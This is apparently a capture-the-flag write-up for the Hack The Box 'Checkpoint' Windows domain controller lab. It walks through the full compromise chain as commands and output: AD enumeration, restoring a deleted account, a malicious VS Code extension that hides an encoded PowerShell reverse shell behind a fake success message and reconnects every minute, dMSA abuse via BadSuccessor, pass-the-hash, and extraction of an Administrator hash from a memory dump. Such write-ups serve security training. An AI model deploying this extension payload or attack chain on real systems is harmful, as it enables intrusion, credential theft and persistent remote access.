# Hack The Box — Checkpoint

Difficulty: Medium

OS: Windows

Target IP: 10.129.38.83

Domain: checkpoint.htb

DC: dc01.checkpoint.htb (10.129.38.145)

## 1. Initial Access

The box starts with valid credentials for the following account:

```text
Username: alex.turner
Password: Checkpoint2024!
```

### Port Scan

```bash
rustscan -a 10.129.38.83 -- -sV -sC -oN nmap
```

The initial scan identified the target as a Windows Domain Controller:

```text
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf            .NET Message Framing
```

Key services identified:

* Kerberos (88) → Active Directory authentication
* LDAP (389, 3268) → Directory services
* SMB (445) → File sharing
* WinRM (5985) → Remote management
* DNS (53) → Domain resolution

### SMB Enumeration

Using the provided credentials, SMB shares were enumerated with `nxc`:

```bash
nxc smb 10.129.38.83 -u 'alex.turner' -p 'Checkpoint2024!' -M spider_plus -o READ_ONLY=true
```
This revealed the available SMB shares:

<img width="1272" height="520" alt="Pasted image 20260907110154" src="https://github.com/user-attachments/assets/bc76d3ed-847d-433d-9319-6208a2ff1fd1" />

The `DevDrop` share was particularly interesting because it was used to distribute VS Code extensions, suggesting a potential supply chain attack vector.

## 2. Active Directory Enumeration

### Finding Writable Objects

`bloodyAD` was used to identify objects that `alex.turner` could modify:

```bash
bloodyad --host 10.129.38.83 -d checkpoint.htb \
  -u 'alex.turner' -p 'Checkpoint2024!' get writable
```

<img width="942" height="373" alt="Pasted image 20260907111452" src="https://github.com/user-attachments/assets/8d410fec-1f55-4a31-9dba-cdfe287a4b6a" />

Among the interesting objects, a deleted user account was discovered.

### Deleted User Discovery

A deleted `Mark Davies` account was found in the Deleted Objects container:

```text
distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
```

The `\0A` in the DN also indicates that the account was marked for deletion. `alex.turner` had sufficient permissions to restore deleted objects.

### Restoring the Deleted Account

```bash
bloodyad --host 10.129.38.83 -d checkpoint.htb \
  -u 'alex.turner' -p 'Checkpoint2024!' \
  set restore \
  'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

Output:

```text
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

The account was restored to:

```text
OU=Employees,DC=checkpoint,DC=htb
```

### Verifying `mark.davies` Permissions

After restoring the account, it was discovered that `mark.davies` shared the same password as `alex.turner`:

```text
Checkpoint2024!
```

The account also had `WRITE` access to the `DevDrop` share:

<img width="1267" height="541" alt="Pasted image 20260907111714" src="https://github.com/user-attachments/assets/13d80f8c-1068-425d-8df3-48c77c090f9b" />

This provided the necessary write access to perform a supply chain attack.

## 3. DevDrop — VS Code Extension Supply Chain

The `DevDrop` share was used to distribute VS Code extensions that were automatically deployed.

The goal was to create a malicious `.vsix` package and upload it to the share.

### Manual VSIX Package Creation

Since `vsce` may not have been available, the `.vsix` package was created manually using the required directory structure.

Directory structure:

```text
[Content_Types].xml
extension/
├── extension.js
└── package.json
```

### `[Content_Types].xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="js" ContentType="application/octet-stream" />
  <Default Extension="vsixmanifest" ContentType="text/xml" />
</Types>
```

This file tells the VS Code installer how to interpret different file extensions within the package.

### `extension.js` — The Malicious Payload

```javascript
const vscode = require('vscode');
const { exec } = require('child_process');

function activate(context) {
    // Display a fake success message to avoid suspicion
    vscode.window.showInformationMessage('Extension "devsupport" activated successfully!');

    // PowerShell reverse shell (Base64 encoded)
    const cmd = `powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA2ADcAIgAsADkAMAA5ADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHl0AGUAcwAuAEwAZQBuAGcAdGgAKQApACAAewAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA'L...`;
    
    // Execute the reverse shell (silent fail)
    exec(cmd, (err, stdout, stderr) => {
        // Errors are ignored to avoid detection
    });

    // Attempt to reconnect every 60 seconds for persistence
    setInterval(() => {
        exec(cmd);
    }, 60000);
}

function deactivate() {}

module.exports = { activate, deactivate };
```

The payload performs the following:

* Displays a fake success message to the user
* Executes a Base64-encoded PowerShell reverse shell
* Attempts to reconnect every 60 seconds
* Silently ignores execution errors

### `package.json`

```json
{
  "name": "checkpoint",
  "displayName": "checkpoint",
  "version": "1.0.0",
  "publisher": "akakaka",
  "engines": {
    "vscode": "^1.118.0"
  },
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
```

Key setting:

```json
"activationEvents": ["*"]
```

This causes the extension to activate automatically.

### Packaging the Extension

The files were compressed into a `.vsix` package and uploaded to the `DevDrop` share:

```bash
smbclient -U 'checkpoint.htb/mark.davies%Checkpoint2024!' //10.129.38.145/DevDrop -c "put checkpoint.vsix"
```

After the extension was deployed, code execution was obtained on the machine responsible for processing the extensions, providing a shell as `ryan.brooks`.

## 4. Obtaining `ryan.brooks`

After the malicious extension was deployed, a reverse shell was obtained as `ryan.brooks`.

<img width="522" height="97" alt="image" src="https://github.com/user-attachments/assets/cc0e2d12-74da-4a21-a3c0-30e2878aeb7c" />

From this point, the attack moved from the supply chain vector into Active Directory privilege escalation.

### BadSuccessor Enumeration

The environment was running Windows Server 2025, making the BadSuccessor (`CVE-2025-53779`) technique relevant.

BadSuccessor abuses permissions over an OU to create a delegated Managed Service Account (dMSA) and configure it to impersonate a target account.

The following tools were obtained from the BadSuccessor repository:

https://github.com/akamai/BadSuccessor

The OU permissions were then checked:

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

Output:

```text
Identity               OUs
--------               ---
CHECKPOINT\ryan.brooks {OU=DMSAHolder,DC=checkpoint,DC=htb}
CHECKPOINT\alex.turner {OU=Employees,DC=checkpoint,DC=htb}
```

<img width="547" height="121" alt="Pasted image 20260908051532" src="https://github.com/user-attachments/assets/9fa39211-8569-492c-bd67-6621dd345887" />

The important result was that `ryan.brooks` had permissions over:

```text
OU=DMSAHolder,DC=checkpoint,DC=htb
```

This OU became the target for the dMSA-based privilege escalation.

### Creating a Malicious dMSA

After obtaining a shell as `ryan.brooks`, `Rubeus` was used to perform the `tgtdeleg` operation and obtain a Kerberos ticket.

```powershell
PS C:\Users\ryan.brooks> .\Rubeus.exe tgtdeleg /nowrap
```

From the output, the Base64-encoded `ticket.kirbi` was extracted.

The ticket was decoded and saved as `dmsa_tgt.kirbi`:

```bash
echo <base64.ticket.kirbi> | base64 -d > dmsa_tgt.kirbi
```

The Kerberos ticket was then converted from `.kirbi` to a ccache file:

```bash
impacket-ticketConverter dmsa_tgt.kirbi ryan.ccache
export KRB5CCNAME=/tmp/ryan.ccache
```

With the Kerberos credential cache configured, `bloodyAD` was used to abuse the BadSuccessor functionality and create a malicious dMSA targeting `svc_deploy`:

```bash
bloodyad -host dc01.checkpoint.htb -d checkpoint.htb -k add badSuccessor evil-dmsa \
-t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' \
--ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

The resulting operation provided the RC4 hash for `svc_deploy`:

```text
e16081eb077aca74bdbf8af12af43ac9
```

At this point, authentication as `svc_deploy` was possible.

## 5. Access as `svc_deploy`

### Pass-the-Hash with Evil-WinRM

The recovered hash was used to authenticate with WinRM:

```bash
evil-winrm -i 10.129.38.145 \
  -u svc_deploy \
  -H e16081eb077aca74bdbf8af12af43ac9
```

A shell was obtained as `svc_deploy`.

### Locating the VM Memory Dump

Since svc_deploy had write access to the VMBackups share, the next target was the VMBackups share.

The memory-forensics directory was inspected:

```powershell
cd C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics
dir
```

Output:

```text
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/9/2026   7:45 PM      106496000 Windows Server 2019-000001.vmdk
-a----          5/9/2026   7:40 PM     2147483648 Windows Server 2019-Snapshot1.vmem
-a----          5/9/2026   7:40 PM      138164859 Windows Server 2019-Snapshot1.vmsn
-a----          5/9/2026   7:39 PM         270840 Windows Server 2019.nvram
-a----          5/9/2026   7:45 PM           7642 Windows Server 2019.scoreboard
-a----          5/9/2026   7:39 PM    10199695360 Windows Server 2019.vmdk
-a----          5/9/2026   7:39 PM            502 Windows Server 2019.vmsd
-a----          5/9/2026   7:45 PM           2749 Windows Server 2019.vmx
-a----          5/9/2026   7:22 PM            274 Windows Server 2019.vmxf
```

The relevant file was:

```text
Windows Server 2019-Snapshot1.vmem
```

Size:

```text
2.1 GB
```

This memory dump contained authentication material for the Administrator account.

### Extracting Credentials with `vmkatz`

```powershell
.\vmkatz.exe `
  "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem" `
  --format ntlm
```

Output:

```text
[*] vmkatz v1.4.1
[*] System discovery: 12.0111894s
[*] Process enumeration: 1.7611ms
[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
[*] Credential extraction: 33.41ms

WIN-0DG6SJAEUTA\Administrator:::f29e9c014295b9b32139b09a2790be3b:::
```

The NTLM hash for `Administrator` was successfully recovered:

```text
f29e9c014295b9b32139b09a2790be3b
```

## 6. Administrator Access

### Pass-the-Hash with Evil-WinRM

The recovered Administrator hash was used for Pass-the-Hash authentication:

```bash
evil-winrm -i 10.129.38.145 \
  -u administrator \
  -H f29e9c014295b9b32139b09a2790be3b
```

<img width="402" height="35" alt="Pasted image 20260908053631" src="https://github.com/user-attachments/assets/d54e4d4b-8130-40f1-a0a6-772318286f70" />

Administrator access was successfully obtained.

## 7. Flags

### User Flag

```powershell
type C:\Users\ryan.brooks\Desktop\user.txt
```

### Root Flag

```powershell
type C:\Users\max.palmer\Desktop\root.txt
```

